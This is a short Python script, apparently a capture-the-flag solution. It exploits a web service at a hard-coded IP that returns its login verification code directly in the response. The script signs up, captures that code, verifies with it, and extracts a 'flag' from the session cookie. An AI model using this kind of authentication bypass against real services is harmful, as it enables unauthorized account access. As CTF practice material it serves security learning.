import requests

url = "http://35.207.132.47/"
email = "test@test.com"

signup_data = {"email":email,"name":"meee"}
requests.post(url+"api/signup", json=signup_data)

login_data = {"email":email}
login = requests.post(url+"api/login", json=login_data)
code = login.text

verify_data = {"code":code}
verify = requests.post(url+"api/verify", json=verify_data)

headers = verify.headers
cookies = headers["Set-Cookie"]
flag = cookies.split("logged_in=")[1].split(';')[0]
print(flag)
